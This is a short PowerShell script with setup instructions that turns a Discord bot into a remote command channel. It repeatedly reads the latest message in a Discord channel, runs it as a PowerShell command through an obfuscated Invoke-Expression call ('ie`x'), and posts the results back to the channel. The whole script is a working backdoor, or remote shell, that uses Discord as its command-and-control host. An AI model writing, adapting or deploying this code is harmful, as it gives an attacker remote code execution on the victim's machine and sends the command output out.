<# =========================== Simple Discord BOT CLI ==========================================

SYNOPSIS
Using a Discord Server Chat as a remote powershell connection / CLI

1. Make a discord bot at https://discord.com/developers/applications/
2. Enable ALL intents and add 'read message history' permission to the copy url
3. Add the bot to your discord server with the url
4. Change BOT_TOKEN below with your bot token
5. Change CHANNEL_ID below to your channel id

#>


$t = "YOUR_BOT_TOKEN"
$c = "YOUR_CHANNEL_ID"
function sndmsg{
    $w.Headers.Add("Content-Type", "application/json")
    $j = @{"content" = "``````$($batch -join "`n")``````"} | ConvertTo-Json
    $x = $w.UploadString($u, "POST", $j)
}
while($true){
    $u = "https://discord.com/api/v10/channels/$c/messages"
    $w = New-Object System.Net.WebClient
    $w.Headers.Add("Authorization", "Bot $t")
    $m = $w.DownloadString($u)
    $r = ($m | ConvertFrom-Json)[0]
    if(-not $r.author.bot){
        $a = $r.timestamp
        $m = $r.content
    }
    if($a -ne $p){
        $p = $a
        $o = ie`x $m
        $resultLines = $o -split "`n"
        $currentBatchSize = 0
        $batch = @()
        foreach ($line in $resultLines) {
            $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
            if (($currentBatchSize + $lineSize) -gt 1900) {
                sndmsg
                sleep 1
                $currentBatchSize = 0
                $batch = @()
            }
            $batch += $line
            $currentBatchSize += $lineSize
        }
        if ($batch.Count -gt 0) {
            sndmsg
        }
    }
    Sleep 5
}
